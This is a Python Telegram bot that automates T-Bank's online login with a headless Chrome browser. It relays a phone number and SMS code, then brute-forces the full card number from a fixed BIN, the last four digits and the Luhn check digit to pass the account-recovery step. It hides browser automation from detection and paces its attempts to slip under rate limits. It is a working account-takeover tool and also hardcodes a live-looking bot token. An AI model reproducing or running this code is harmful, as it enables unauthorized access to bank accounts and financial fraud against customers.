import logging
import threading
import time
import random
from enum import Enum
from typing import Dict, Optional
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

# Define states for conversation
class State(Enum):
    WAITING_PHONE = 1
    WAITING_SMS = 2
    WAITING_LAST4 = 3
    BRUTE_FORCE = 4

# User session data structure
class UserSession:
    def __init__(self, user_id: int):
        self.user_id = user_id
        self.state = State.WAITING_PHONE
        self.phone = ""
        self.driver = None
        self.last4 = ""
        self.bin = "220070"
        self.current_candidate = 0
        self.found_card = None
        self.brute_force_thread = None
        self.stop_brute_force = False

# Store user sessions
user_sessions: Dict[int, UserSession] = {}

# Telegram Bot Token (replace with your token)
TOKEN = "8163066452:AAGc_n0x--A0xtmCdVwp5NGZLsCi5qFC0_I"

# T-Bank URLs
LOGIN_URL = "https://id.tbank.ru/auth/step?cid=vuScwCCJhyGa"

# Luhn algorithm implementation
def luhn_check_15(s: str) -> int:
    """Calculate Luhn check digit for 15-digit string"""
    s_rev = s[::-1]
    total = 0
    for i, char in enumerate(s_rev):
        digit = int(char)
        if i % 2 == 0:
            doubled = digit * 2
            total += doubled // 10 + doubled % 10
        else:
            total += digit
    return (10 - (total % 10)) % 10

def human_delay(min_sec=0.3, max_sec=1.5):
    """Random delay to simulate human behavior"""
    time.sleep(random.uniform(min_sec, max_sec))

def human_type(element, text):
    """Type text with random delays between keystrokes"""
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(0.05, 0.2))

def start_browser_session(session: UserSession):
    """Start a headless Chrome browser session"""
    try:
        options = webdriver.ChromeOptions()
        options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--disable-gpu')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.binary_location = '/usr/bin/google-chrome-stable'
        
        service = Service(ChromeDriverManager().install())
        session.driver = webdriver.Chrome(service=service, options=options)
        
        # Execute CDP commands to further hide automation
        session.driver.execute_cdp_cmd('Network.setUserAgentOverride', {
            "userAgent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        session.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
        session.driver.get(LOGIN_URL)
        human_delay(2, 4)
    except Exception as e:
        logger.error(f"Failed to start browser: {e}")
        raise

def enter_phone_number(session: UserSession):
    """Enter phone number on T-Bank login page"""
    try:
        phone_input = WebDriverWait(session.driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='tel']"))
        )
        human_delay(0.5, 1.5)
        phone_input.click()
        human_delay(0.3, 0.8)
        phone_input.clear()
        human_delay(0.2, 0.5)
        
        # Remove + from phone number for input
        phone_to_enter = session.phone.lstrip('+')
        human_type(phone_input, phone_to_enter)
        
        human_delay(0.5, 1.2)
        continue_btn = session.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        continue_btn.click()
        human_delay(2, 3)
        return True
    except Exception as e:
        logger.error(f"Error entering phone number: {e}")
        return False

def enter_sms_code(session: UserSession, code: str):
    """Enter SMS code on T-Bank page"""
    try:
        code_input = WebDriverWait(session.driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='text'][inputmode='numeric']"))
        )
        human_delay(0.5, 1.0)
        code_input.click()
        human_delay(0.3, 0.6)
        code_input.clear()
        human_delay(0.2, 0.4)
        human_type(code_input, code)
        
        human_delay(0.5, 1.0)
        continue_btn = session.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        continue_btn.click()
        human_delay(3, 4)
        
        # Check if password page appears
        try:
            forgot_pass_btn = session.driver.find_element(By.XPATH, "//button[contains(text(), 'Не помню пароль')]")
            human_delay(0.5, 1.0)
            forgot_pass_btn.click()
            human_delay(2, 3)
        except NoSuchElementException:
            pass
        
        # Wait for card number input page
        WebDriverWait(session.driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='text'][inputmode='numeric']"))
        )
        return True
    except Exception as e:
        logger.error(f"Error entering SMS code: {e}")
        return False

def try_card_number(session: UserSession, card_number: str) -> bool:
    """Try a card number on T-Bank page and check if successful"""
    try:
        # Find card number input
        card_input = session.driver.find_element(By.CSS_SELECTOR, "input[type='text'][inputmode='numeric']")
        human_delay(0.5, 1.0)
        card_input.click()
        human_delay(0.3, 0.6)
        card_input.clear()
        human_delay(0.2, 0.4)
        human_type(card_input, card_number)
        
        # Click continue
        human_delay(0.7, 1.5)
        continue_btn = session.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        continue_btn.click()
        
        # Wait and check for redirect
        human_delay(5, 7)
        current_url = session.driver.current_url
        
        # Check if URL changed (successful redirect)
        if "step" in current_url and current_url != LOGIN_URL:
            # Additional check for account page elements
            page_source = session.driver.page_source
            if "счет" in page_source.lower() or "баланс" in page_source.lower():
                return True
        return False
    except Exception as e:
        logger.error(f"Error trying card number {card_number}: {e}")
        return False

async def brute_force_worker(session: UserSession, app: Application):
    """Worker thread for brute-forcing card numbers"""
    try:
        for candidate in range(session.current_candidate, 1000000):
            if session.stop_brute_force:
                break
                
            candidate_str = str(candidate).zfill(6)
            first_15 = session.bin + candidate_str + session.last4[:3]
            
            # Check Luhn validation
            if luhn_check_15(first_15) == int(session.last4[3]):
                full_card = session.bin + candidate_str + session.last4
                
                # Try the card number
                if try_card_number(session, full_card):
                    session.found_card = full_card
                    session.stop_brute_force = True
                    
                    # Send success message
                    await app.bot.send_message(
                        chat_id=session.user_id,
                        text=f"✅ Успех! Найдена карта: {full_card}"
                    )
                    
                    # Close browser
                    if session.driver:
                        session.driver.quit()
                    return
            
            # Update progress every 1000 candidates
            if candidate % 1000 == 0:
                progress = (candidate / 1000000) * 100
                await app.bot.send_message(
                    chat_id=session.user_id,
                    text=f"⏳ Прогресс: {progress:.1f}% (проверено {candidate} комбинаций)"
                )
            
            human_delay(10, 15)  # Wait between attempts to avoid rate limiting
            
            session.current_candidate = candidate + 1
        
        # If loop completes without finding
        await app.bot.send_message(
            chat_id=session.user_id,
            text="❌ Не удалось найти подходящую карту. Попробуйте с другими данными."
        )
        
    except Exception as e:
        logger.error(f"Error in brute force worker: {e}")
        await app.bot.send_message(
            chat_id=session.user_id,
            text=f"❌ Ошибка в процессе подбора: {str(e)}"
        )
    finally:
        # Cleanup
        if session.driver:
            session.driver.quit()
        if session.user_id in user_sessions:
            del user_sessions[session.user_id]

# Telegram bot handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the conversation and ask for phone number"""
    user_id = update.effective_user.id
    
    if user_id in user_sessions:
        await update.message.reply_text("❌ У вас уже есть активная сессия. Закончите текущую.")
        return ConversationHandler.END
    
    session = UserSession(user_id)
    user_sessions[user_id] = session
    
    await update.message.reply_text(
        "👋 Добро пожаловать! Отправьте номер телефона в формате +79999999999"
    )
    return State.WAITING_PHONE.value

async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receive phone number and start browser session"""
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await update.message.reply_text("❌ Сессия не найдена. Начните с /start")
        return ConversationHandler.END
    
    session = user_sessions[user_id]
    phone = update.message.text.strip()
    
    # Validate phone number format
    if not phone.startswith('+7') or len(phone) != 12:
        await update.message.reply_text("❌ Неверный формат номера. Используйте +79999999999")
        return State.WAITING_PHONE.value
    
    session.phone = phone
    
    # Start browser session
    await update.message.reply_text("🔄 Запускаю браузер...")
    try:
        start_browser_session(session)
        if enter_phone_number(session):
            await update.message.reply_text(
                "✅ Номер введен. Теперь отправьте SMS код, который пришел на телефон:"
            )
            session.state = State.WAITING_SMS
            return State.WAITING_SMS.value
        else:
            await update.message.reply_text("❌ Ошибка при вводе номера. Попробуйте еще раз.")
            return State.WAITING_PHONE.value
    except Exception as e:
        logger.error(f"Error starting browser: {e}")
        await update.message.reply_text(f"❌ Ошибка: {str(e)}")
        return ConversationHandler.END

async def receive_sms(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receive SMS code and proceed to card entry"""
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await update.message.reply_text("❌ Сессия не найдена. Начните с /start")
        return ConversationHandler.END
    
    session = user_sessions[user_id]
    sms_code = update.message.text.strip()
    
    # Validate SMS code
    if not sms_code.isdigit() or len(sms_code) != 4:
        await update.message.reply_text("❌ Неверный формат кода. Отправьте 4 цифры.")
        return State.WAITING_SMS.value
    
    await update.message.reply_text("🔄 Ввожу код...")
    try:
        if enter_sms_code(session, sms_code):
            await update.message.reply_text(
                "✅ Код принят. Теперь отправьте последние 4 цифры карты:"
            )
            session.state = State.WAITING_LAST4
            return State.WAITING_LAST4.value
        else:
            await update.message.reply_text("❌ Ошибка при вводе кода. Попробуйте еще раз.")
            return State.WAITING_SMS.value
    except Exception as e:
        logger.error(f"Error entering SMS: {e}")
        await update.message.reply_text(f"❌ Ошибка: {str(e)}")
        return ConversationHandler.END

async def receive_last4(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receive last 4 digits and start brute force"""
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await update.message.reply_text("❌ Сессия не найдена. Начните с /start")
        return ConversationHandler.END
    
    session = user_sessions[user_id]
    last4 = update.message.text.strip()
    
    # Validate last 4 digits
    if not last4.isdigit() or len(last4) != 4:
        await update.message.reply_text("❌ Неверный формат. Отправьте 4 цифры.")
        return State.WAITING_LAST4.value
    
    session.last4 = last4
    
    await update.message.reply_text(
        f"🔍 Начинаю подбор карты с последними цифрами {last4}...\n"
        f"Это займет некоторое время (примерно 10 минут)."
    )
    
    # Start brute force as async task
    import asyncio
    session.brute_force_thread = asyncio.create_task(
        brute_force_worker(session, context.application)
    )
    
    session.state = State.BRUTE_FORCE
    return State.BRUTE_FORCE.value

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the current operation"""
    user_id = update.effective_user.id
    if user_id in user_sessions:
        session = user_sessions[user_id]
        session.stop_brute_force = True
        
        if session.driver:
            session.driver.quit()
        
        del user_sessions[user_id]
    
    await update.message.reply_text("❌ Операция отменена.")
    return ConversationHandler.END

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    logger.error(f"Update {update} caused error {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text("❌ Произошла ошибка. Попробуйте еще раз.")

def main():
    """Start the bot"""
    app = Application.builder().token(TOKEN).build()
    
    # Create conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            State.WAITING_PHONE.value: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)
            ],
            State.WAITING_SMS.value: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_sms)
            ],
            State.WAITING_LAST4.value: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_last4)
            ],
            State.BRUTE_FORCE.value: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, 
                             lambda update, context: asyncio.create_task(update.message.reply_text("⏳ Идет подбор карты...")))
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )
    
    app.add_handler(conv_handler)
    app.add_error_handler(error_handler)
    
    # Start the Bot
    app.run_polling()

if __name__ == '__main__':
    main()